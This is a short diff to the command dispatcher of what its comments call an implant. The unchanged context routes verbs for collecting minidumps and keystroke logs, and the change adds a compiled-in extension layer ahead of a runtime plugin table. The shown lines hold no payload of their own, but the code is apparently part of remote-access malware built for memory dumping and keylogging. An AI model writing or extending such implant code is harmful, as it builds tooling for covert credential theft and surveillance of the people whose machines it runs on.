@@ -159,11 +159,17 @@ pub fn dispatch(
         "collect.minidump" => crate::sensitive::collect_minidump(arguments),
         #[cfg(windows)]
         "collect.keylog" => crate::sensitive::collect_keylog(arguments),
-        _ => plugins.dispatch(verb, arguments).unwrap_or_else(|| {
-            HandlerOutput::fail(format!(
-                "{verb}: this build carries no handler for the verb"
-            ))
-        }),
+        // The dispatch chain (architecture.md Sec 5.3, ADR-022): the
+        // compiled core answers first, a compiled-in extension second
+        // (implant-native code, in reach of the implant's own internals),
+        // and the runtime plugin table last -- the loadable long tail.
+        _ => crate::extensions::dispatch(verb, arguments)
+            .or_else(|| plugins.dispatch(verb, arguments))
+            .unwrap_or_else(|| {
+                HandlerOutput::fail(format!(
+                    "{verb}: this build carries no handler for the verb"
+                ))
+            }),
     }
 }
 
